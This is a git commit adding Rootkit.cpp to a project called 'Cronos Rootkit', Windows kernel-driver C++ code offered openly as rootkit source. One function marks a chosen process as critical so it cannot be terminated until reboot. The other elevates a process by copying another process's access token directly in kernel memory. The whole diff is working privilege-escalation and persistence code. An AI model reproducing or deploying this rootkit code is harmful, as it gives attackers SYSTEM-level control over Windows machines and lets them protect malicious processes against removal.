3db4c681b4c63eceb0cdaf7da4fc73206dc54221
Administrator <ksawery-czapczynski@wp.pl>
2021-09-09 11:22:36 +0200

    Rootkit code added

---
+++ Cronos Rootkit/Rootkit.cpp
@@ -0,0 +1,117 @@
+////
+//		FUNCTIONS USED TO ELEVAET AND PROTECTS PROCESSES
+////
+#include "Rootkit.h"
+
+NTSTATUS ProtectProcess(DWORD PID)
+{
+	NTSTATUS status = STATUS_SUCCESS;
+
+	CLIENT_ID clientId;
+	HANDLE handle, hToken;
+
+	TOKEN_PRIVILEGES tkp = { 0 };
+	OBJECT_ATTRIBUTES objAttr;
+	ULONG BreakOnTermination = 1;
+
+	clientId.UniqueThread = NULL;
+	clientId.UniqueProcess = ULongToHandle(PID);
+	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
+
+	status = ZwOpenProcess(&handle, PROCESS_ALL_ACCESS, &objAttr, &clientId);
+	if (!NT_SUCCESS(status))
+	{
+		KdPrint(("[-] Failed to open process: %d\n", status));
+		return status;
+	}
+
+	status = ZwOpenProcessTokenEx(handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, OBJ_KERNEL_HANDLE, &hToken);
+	if (!NT_SUCCESS(status))
+	{
+		KdPrint(("[-] Failed to open token\n"));
+		ZwClose(hToken);
+		return status;
+	}
+
+	tkp.PrivilegeCount = 1;
+	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	tkp.Privileges[0].Luid = RtlConvertLongToLuid(SE_DEBUG_PRIVILEGE);
+
+	status = ZwAdjustPrivilegesToken(hToken, FALSE, &tkp, 0, NULL, NULL);
+	if (!NT_SUCCESS(status))
+	{
+		KdPrint(("[-] Failed to adjust token\n"));
+		ZwClose(hToken);
+		return status;
+	}
+
+	status = ZwSetInformationProcess(handle, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
+	if (!NT_SUCCESS(status))
+	{
+		KdPrint(("[-] Failed to set information process\n"));
+		ZwClose(hToken);
+		return status;
+	}
+	KdPrint(("[*] Process successfully set as critical!\n"));
+
+	tkp.Privileges[0].Luid = RtlConvertLongToLuid(SE_TCB_PRIVILEGE);
+	status = ZwSetInformationProcess(handle, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
+	if (!NT_SUCCESS(status))
+	{
+		KdPrint(("[-] Failed to set information process: nr 2\n"));
+		ZwClose(hToken);
+		return status;
+	}
+	KdPrint(("[!] The process has become part of the system!\n"));
+	KdPrint(("[!] You want be able to close process untile next reboot\n"));
+
+	ZwClose(hToken);
+	return status;
+}
+
+NTSTATUS ProcessElevation(ULONG srcPid, ULONG targetPid)
+{
+	NTSTATUS status = STATUS_SUCCESS;
+	PEPROCESS pTargetProcess, pSrcProcess;
+
+	__try
+	{
+		//Getting target process
+		status = PsLookupProcessByProcessId(ULongToHandle(targetPid), &pTargetProcess);
+		if (!NT_SUCCESS(status))
+		{
+			KdPrint(("[-] Target PID PsLookup failed\n"));
+			return status;
+		}
+		KdPrint(("[+] Target EProcess address: 0x%p\n", pTargetProcess));
+
+		//Getting source process
+		status = PsLookupProcessByProcessId(ULongToHandle(srcPid), &pSrcProcess);
+		if (!NT_SUCCESS(status))
+		{
+			KdPrint(("[-] Source PID PsLookup failed\n"));
+			return status;
+		}
+		KdPrint(("[+] Source EProcess address: 0x%p\n", pSrcProcess));
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		KdPrint(("[-] Target or source PID PsLookup failed\n"));
+		return EXCEPTION_EXECUTE_HANDLER;
+	}
+
+	__try
+	{
+		KdPrint(("[+] Setting source token to the target token\n"));
+
+		*(UINT64*)((UINT64)pTargetProcess + (UINT64)TOKEN) = *(UINT64*)(UINT64(pSrcProcess) + (UINT64)TOKEN);
+		KdPrint(("[*] Source token copied to the target!\n"));
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		KdPrint(("[-] Setting target token to source token failed!\n"));
+		return EXCEPTION_EXECUTE_HANDLER;
+	}
+
+	return status;
+}
